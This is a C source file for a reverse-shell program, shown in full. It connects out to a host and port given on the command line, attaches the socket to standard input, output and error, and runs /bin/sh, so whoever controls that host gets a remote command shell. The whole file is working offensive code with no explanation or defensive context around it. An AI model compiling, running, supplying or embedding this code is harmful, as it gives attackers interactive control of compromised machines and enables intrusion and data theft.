#include <sys/types.h>
#include <sys/socket.h>
#include <sys/wait.h>
#include <netinet/in.h>
#include <netdb.h>
#include <unistd.h>
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

#define die(msg) \
	do { perror(msg); exit(1); } while (0)

int do_callback(const char *host, const char *port);
void connect_to_shell(int connfd);

int main(int argc, char *argv[])
{
	int sockfd;

	if (argc != 3) {
		fprintf(stderr, "USAGE: %s host port\n", argv[0]);
		exit(1);
	}

	sockfd = do_callback(argv[1], argv[2]);
	connect_to_shell(sockfd);

	return 0;
}

int do_callback(const char *host, const char *port)
{
	struct addrinfo hints;
	struct addrinfo *result, *rp;
	int sockfd;
	int s;

	memset(&hints, 0, sizeof(struct addrinfo));
	hints.ai_family = AF_UNSPEC;
	hints.ai_socktype = SOCK_STREAM;

	s = getaddrinfo(host, port, &hints, &result);
	if (0 != s) {
		fprintf(stderr, "getaddrinfo: %s\n", gai_strerror(s));
		exit(1);
	}

	for (rp = result; rp != NULL; rp = rp->ai_next) {
		sockfd = socket(rp->ai_family, rp->ai_socktype, 
				rp->ai_protocol);
		if (-1 == sockfd) {
			continue;
		}

		if (-1 != connect(sockfd, rp->ai_addr, rp->ai_addrlen)) {
			break;
		}

		close(sockfd);
	}

	if (NULL == rp) {
		die("Failed to connect");
	}

	freeaddrinfo(result);

	return sockfd;
}

void connect_to_shell(int connfd)
{
	dup2(connfd, 0);
	dup2(connfd, 1);
	dup2(connfd, 2);
	char* const args[] = {"/bin/sh", NULL};
	if (-1 == execv("/bin/sh", args)) {
		die("execv");
	}
}

